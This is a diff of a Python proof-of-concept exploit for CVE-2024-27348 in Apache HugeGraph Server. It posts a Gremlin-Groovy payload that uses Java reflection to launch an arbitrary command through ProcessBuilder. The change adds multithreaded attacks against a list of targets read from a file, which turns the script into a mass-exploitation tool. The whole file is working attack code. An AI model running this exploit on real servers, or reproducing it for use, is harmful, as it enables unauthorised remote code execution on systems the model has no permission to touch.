@@ -1,15 +1,15 @@
 import requests
 import argparse
 import json
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-
-def exploit(target, command):
-    url = f"{target}/gremlin"
+def exploit(session, target, command):
+    url = f"http://{target}:8080/gremlin"
     headers = {
         "Content-Type": "application/json"
     }
     payload1 = {
-        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"{command}\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
+        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.util.List command = java.util.Arrays.asList(\"{command}\");Object processBuilderInstance = processBuilderClass.getConstructor(java.util.List.class).newInstance(command);processBuilderClass.getMethod(\"start\").invoke(processBuilderInstance);",
         "bindings": {},
         "language": "gremlin-groovy",
         "aliases": {}
@@ -20,47 +20,42 @@ def exploit(target, command):
     }
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload1), verify=False, timeout=5)
-        if (response.status_code == 500 or response.status_code == 200) and ("\"code\":200" in response.text) and ("Failed to do request" not in response.text):
-            print(f"[+] Command executed successfully with payload 1")
-            print("[+] Response:")
-            print(response.text)
+        response = session.post(url, headers=headers, data=json.dumps(payload1), timeout=5)
+        if response.status_code in {200, 500} and "\"code\":200" in response.text:
+            print(f"[+] {target}: Command executed successfully with payload 1")
         else:
-            print(f"[-] Request failed with status code: {response.status_code}")
-            print(f"[-] {target} may not be vulnerable")
-            print(response.text)
-            response = requests.post(url, headers=headers, data=json.dumps(payload2), verify=False, timeout=5)
-        if (response.status_code == 200 or response.status_code == 500) or ("\"code\":200" in response.text) or ("Failed to do request" not in response.text):
-            print(f"[+] Command executed successfully with payload 2")
-            print("[+] Response:")
-            print(response.text)
-        else:
-            print(f"[-] Request failed with status code: {response.status_code}")
-            print(f"[-] {target} may not be vulnerable")
-            print(response.text)
-
+            response = session.post(url, headers=headers, data=json.dumps(payload2), timeout=5)
+            if response.status_code in {200, 500} and "\"code\":200" in response.text:
+                print(f"[+] {target}: Command executed successfully with payload 2")
+            else:
+                print(f"[-] {target}: Request failed with status code {response.status_code}")
     except Exception as e:
-            print(f"Exception with {target}")
+        print(f"[-] {target}: Exception occurred - {e}")
 
-def process_targets(file, command):
+
+def process_targets(file, command, max_threads=10):
     with open(file, 'r') as f:
-        for line in f:
-            target = line.strip()
-            exploit(target, command)
+        targets = [line.strip() for line in f]
+    
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        with requests.Session() as session:
+            futures = [executor.submit(exploit, session, target, command) for target in targets]
+            for future in as_completed(futures):
+                future.result()
 
 
 if __name__ == "__main__":
-    print("Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server by kljunowsky")
-    parser = argparse.ArgumentParser(
-        description="Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server")
+    parser = argparse.ArgumentParser(description="Proof of Concept exploit for CVE-2024-27348 Remote Code Execution in Apache HugeGraph Server")
     parser.add_argument("-c", "--command", required=True, help="Command to execute on target")
     parser.add_argument("-f", "--file", required=False, help="Import targets from a file")
     parser.add_argument("-t", "--target", required=False, help="Target Domain/IP")
+    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
     args = parser.parse_args()
 
     if args.file:
-        process_targets(args.file, args.command)
+        process_targets(args.file, args.command, args.threads)
     elif args.target:
-        exploit(args.target, args.command)
+        with requests.Session() as session:
+            exploit(session, args.target, args.command)
     else:
         print("Specify target with -t/--target or import targets from a file using -f/--file")
